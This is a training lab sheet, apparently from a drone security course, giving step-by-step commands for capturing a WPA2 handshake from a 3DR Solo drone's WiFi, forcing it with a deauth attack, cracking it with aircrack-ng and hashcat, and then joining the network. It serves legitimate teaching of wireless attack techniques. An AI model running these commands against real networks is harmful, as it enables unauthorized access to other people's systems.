# Lab: Cracking Wireless Communications **Type:** Lab **Duration:** 60 minutes **Section:** Day 2 – RF Communications --- ## Objectives - Capture a WPA2 4-way handshake from the drone's GCS WiFi network - Crack the captured handshake with a dictionary attack - Apply the narrow channel bandwidth technique to improve capture speed - Gain unauthorized access to the drone network using the cracked key --- ## Prerequisites - Kali Linux laptop - TP-Link USB WiFi adapter (supports monitor mode) - Target: 3DR Solo SoloLink WiFi --- ## Background: WPA2 Authentication (EAPOL) WPA2-PSK (Pre-Shared Key) authentication uses a 4-way handshake to derive session keys: ``` Client AP | | |--- Association Request ------>| |<-- ANonce (random) -----------| (Message 1) |--- SNonce + MIC ------------->| (Message 2) |<-- GTK + MIC (encrypted) ----| (Message 3) |--- ACK --------------------- >| (Message 4) ``` The **4-way handshake** is captured from the air. The PSK can then be brute-forced offline because: 1. The attacker captures messages 1 and 2 (both contain public nonces) 2. The PSK is used to derive the PMK and then the PTK 3. An attacker can test candidate passwords: PMK = PBKDF2(HMAC-SHA1, password, SSID, 4096, 256) --- ## Ain't no in this Lab. You are root and you will like it. Remember to ** in every terminal you open. ```bash sudo su - ``` --- ## Phase 1: Kali USB passthrough In VirtualBox you need to confgure the USB passtrough to be able to see the WiFi card in your Kali Linux. - Find the devices menu in VirtualBox and click on `Realtek 802.11ac WLAN Adapter` --- ## Phase 2: Setup Monitor Mode ```bash # Check your WiFi adapters iwconfig ip link show airmon-ng # Identify the TP-Link adapter (usually wlan0) # Kill processes that interfere with monitor mode airmon-ng check kill # Start monitor mode on the TP-Link adapter airmon-ng start wlan0 # Verify monitor mode is active iwconfig # Should show wlan0mon (or similar) in Monitor mode # wlan0 IEEE 802.11 Mode:Monitor Frequency:2.457 GHz Tx-Power=20 dBm # Retry short limit:7 RTS thr:off Fragment thr:off # Power Management:on ``` --- ## Phase 2: Survey the Wireless Environment ```bash # Scan for available networks airodump-ng wlan0mon # Look for your target: # BSSID: (MAC address of Solo/Specta AP) # ESSID: SoloLink_XXXXXXXX or SpectraXXXXXX # CH: channel number # ENC: WPA2 # Note the BSSID and channel for your target # Note: airodump can *choke* or *throttle* in a VM ... # ... feel free to stop and restart as needed # 'q' 'q' ``` --- ## Phase 3: Capture the 4-Way Handshake ```bash # Start targeted capture (replace with your target values) airodump-ng wlan0mon \ --bssid \ --channel \ --write rflab # airodump-ng will write files: # rflab-01.cap (packet capture) # rflab-01.csv (scan log) # and more ``` --- ## Trigger the handshake **Option A — wait** - Wait for a device to connect or reconnect to the AP - This can take several minutes **Option B - manual reauth** - toggle your phone's wifi on/off - forget the network and reconnect **Option C — deauth attack** ```bash # In a separate terminal: send deauth packets to force reconnection aireplay-ng --deauth 3 -a wlan0mon # -a: AP BSSID # Sends 3 deauthentication frames → client will reconnect → handshake captured ``` **In airodump-ng output, look for:** ``` [ WPA handshake: XX:XX:XX:XX:XX:XX ] ``` This confirms the handshake was captured. --- ## Phase 4: Crack the Handshake (1/3) ### Prep a dictionary ```bash cd /usr/share/wordlists gunzip rockyou.txt.gz head -n 100000 rockyou.txt > rockyou-100k.txt ``` ### Option A: Dictionary Attack ```bash # Use rockyou.txt wordlist (included in Kali) aircrack-ng rflab-01.cap \ -w /usr/share/wordlists/rockyou-100k.txt \ -e Beagle_A1B2 # If successful: # KEY FOUND! [ 88888888 ] ``` ## Phase 4: Crack the Handshake (2/3) ### Option B: Custom Wordlist (REFERENCE ONLY) Create a targeted wordlist based on OSINT about the target: ```bash # Using crunch to generate all 8-character numeric passwords crunch 8 8 0123456789 > custom-wordlist.txt # Using cewl to generate words from a website cewl https://3dr.com -d 2 -m 5 > 3dr-wordlist.txt # Combine lists cat rockyou.txt 3dr-wordlist.txt > combined.txt aircrack-ng rflab-01.cap -w combined.txt -e SoloLink_XXXXXXXX ``` ## Phase 4: Crack the Handshake (3/3) ### Option C: hashcat (GPU accelerated) ```bash apt -y install hcxdumptool hcxtools ``` ```bash # Convert cap file to hashcat format hcxpcapngtool -o hash.hc22000 rflab-01.cap # Run hashcat (WPA2 = mode 22000) hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou-100k.txt ``` --- ## Phase 5: Narrow Channel Bandwidth Technique Some WiFi adapters have trouble capturing full 20/40 MHz channel width frames. The **narrow channel bandwidth** technique reconfigures the AP to use a narrower channel width, making capture more reliable. **How it works:** 1. Access the target router's admin interface (possible if you have credentials from a prior step) 2. Set channel bandwidth to 5 MHz or 10 MHz 3. This reduces the signal bandwidth — easier to capture with a narrower-filter SDR ```bash # If you have access to the OpenWRT router (GL.iNet from the UART lab): ssh root@192.168.8.1 # Edit wireless config vim /etc/config/wireless # Find: option htmode 'HT20' # Change to: option chanbw '10' # Apply: wifi # On Kali, configure adapter to match narrow channel iwconfig wlan0mon channel 6 # Use airmon-ng with the narrower channel airodump-ng wlan0mon --channel 6 ``` --- ## Phase 6: Connect with Cracked Password ```bash # Stop monitor mode airmon-ng stop wlan0mon # Connect to target WiFi with cracked password nmcli dev wifi connect "SoloLink_XXXXXXXX" password "sololink" # Verify connectivity ip a ping 10.1.1.1 ``` --- ## Discussion Questions 1.
